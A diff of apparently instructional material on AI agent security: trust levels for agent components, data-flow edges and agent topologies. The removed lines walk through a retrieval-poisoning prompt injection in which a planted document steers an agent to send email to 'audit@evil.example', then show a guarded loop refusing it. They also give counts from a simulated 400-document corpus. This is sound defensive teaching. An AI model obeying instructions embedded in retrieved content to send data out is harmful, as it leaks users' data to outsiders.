@@ -1,46 +1,29 @@
-component     trust  role
-agent_loop        2  turns model output into tool calls, then asks again
-app               2  the surface a person talks to
-mcp_server        0  somebody else's process, exposing tools
-memory            1  carries state between turns
-model             1  predicts tokens; holds no credential and opens no socket
-retrieval         0  pulls documents into the context window at query time
-tools             2  the only components that change anything
+component       trust  role
+agent_runtime       2  the plan-act-observe loop; turns text into action
+egress              2  where data is allowed to go
+identity            2  who is calling, and on whose behalf
+ingress             2  where a request enters the system
+knowledge           0  retrieval; pulls documents in at query time
+mcp                 0  a third party's process exposing tools
+memory              1  state that persists across turns and sessions
+messaging           1  the agent-to-agent channel
+model               1  predicts tokens; no credential, no socket
+observability       2  what can be reconstructed afterwards
+orchestrator        2  routes work to agents and chooses the topology
+policy              2  may this caller do this, to this resource
+tools               2  the only components that change anything
 
-edges
-   app          -> agent_loop   the user's request
-   agent_loop   -> model        the context window
-   model        -> agent_loop   a request to call a tool
-   agent_loop   -> tools        THE TOOL CALL - text becomes consequence
-   retrieval    -> agent_loop   documents, pasted into the context
-   mcp_server   -> agent_loop   tool descriptions and tool results
-   memory       -> agent_loop   state from earlier turns
-component    trust  floor  what happened
-app              2      2  user asks: summarise the incident from ticket 4471
-retrieval        0      0  document pulled in: INC-4471: database timeouts after the 
-agent_loop       2      0  context window assembled
-model            1      0  predicts: call a tool
-agent_loop       2      0  TOOL CALL  <-- text becomes consequence
+UNTRUSTED SOURCES (trust 0) - an outsider can author content here
+   knowledge, mcp
 
-By the time the tool is called, content of trust 0 is in the context.
-The tool call itself carries the user's authority - trust 2 - and nothing
-in the request records that a trust-0 document helped choose it.
-clean corpus  -> ('summarise', None)
-poisoned doc  -> ('send_email', 'audit@evil.example')
+TOPOLOGIES
+   orchestrator-worker       ingress -> orchestrator -> agent_runtime -> messaging -> tools
+   peer handoff              ingress -> agent_runtime -> messaging -> agent_runtime -> tools
+   single agent              ingress -> agent_runtime -> tools
+   swarm                     ingress -> orchestrator -> messaging -> agent_runtime -> memory -> tools
+   workflow with agent steps ingress -> orchestrator -> agent_runtime -> tools -> policy
 
-Nobody was compromised. The wiki page was edited - which is what wiki
-pages are for. The document entered the same string as the operator's
-instructions, and the loop could not tell them apart, because by then
-there was nothing left to tell apart with.
-clean corpus  -> ('summarise', None)
-poisoned doc  -> ('refused', 'instruction came from retrieval (trust 0)')
-
-The document is still read, still summarised, still useful. What it can
-no longer do is choose a tool.
-documents            : 400
-of which poisoned    : 134
-naive loop  fired    : 134
-guarded loop fired   : 0
-
-Seven components, two boundaries. Every control in Function A binds to
-one of them, and the next lesson is the map of which control binds where.
+In all five topologies the same edge exists: something reaches
+agent_runtime, and agent_runtime reaches tools. That edge is where text
+becomes consequence, and it is the edge every control in Chapters 2 and 3
+is trying to stand on.
